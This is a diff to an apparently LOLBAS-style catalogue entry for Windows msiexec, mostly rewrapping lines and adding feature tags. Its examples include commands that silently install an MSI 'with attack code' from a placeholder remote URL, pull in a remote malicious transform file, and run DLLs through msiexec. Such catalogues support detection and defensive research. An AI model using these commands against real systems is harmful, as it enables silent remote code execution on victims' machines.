@@ -2,7 +2,8 @@
 id: windows-execution-msiexec
 namespace: windows:execution:msiexec
 name: msiexec
-description: 'Used by Windows to execute msi files Located at: C:\Windows\System32\msiexec.exe; C:\Windows\SysWOW64\msiexec.exe.'
+description: 'Used by Windows to execute msi files Located at: C:\Windows\System32\msiexec.exe;
+  C:\Windows\SysWOW64\msiexec.exe.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -41,7 +42,12 @@ resource_profile:
 allowed-tools:
 - msiexec
 parameters: []
-features: []
+features:
+- file-system
+- local
+- pipes-stdin
+- pipes-stdout
+- process-manip
 execution:
   template: msiexec
   sandbox: execFile
@@ -49,15 +55,22 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Installs the target .MSI file silently. (Execute custom made msi file with attack code)
+- description: Installs the target .MSI file silently. (Execute custom made msi file
+    with attack code)
   command: msiexec /quiet /i {PATH:.msi}
-- description: Installs the target remote & renamed .MSI file silently. (Execute custom made msi file with attack code from remote server)
+- description: Installs the target remote & renamed .MSI file silently. (Execute custom
+    made msi file with attack code from remote server)
   command: msiexec /q /i {REMOTEURL}
 - description: Calls DllRegisterServer to register the target DLL. (Execute dll files)
   command: msiexec /y {PATH_ABSOLUTE:.dll}
-- description: Calls DllUnregisterServer to un-register the target DLL. (Execute dll files)
+- description: Calls DllUnregisterServer to un-register the target DLL. (Execute dll
+    files)
   command: msiexec /z {PATH_ABSOLUTE:.dll}
-- description: Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input. (Install trusted and signed msi file, with additional attack code as transformation file, from a remote server)
+- description: Installs the target .MSI file from a remote URL, the file can be signed
+    by vendor. Additional to the file a transformation file will be used, which can
+    contains malicious code or binaries. The /qb will skip user input. (Install trusted
+    and signed msi file, with additional attack code as transformation file, from
+    a remote server)
   command: msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS="{REMOTEURL:.mst}" /qb
 references:
 - label: ''
@@ -88,7 +101,6 @@ install:
   commands:
   - choco install msiexec
 ---
-
 
 # msiexec
 
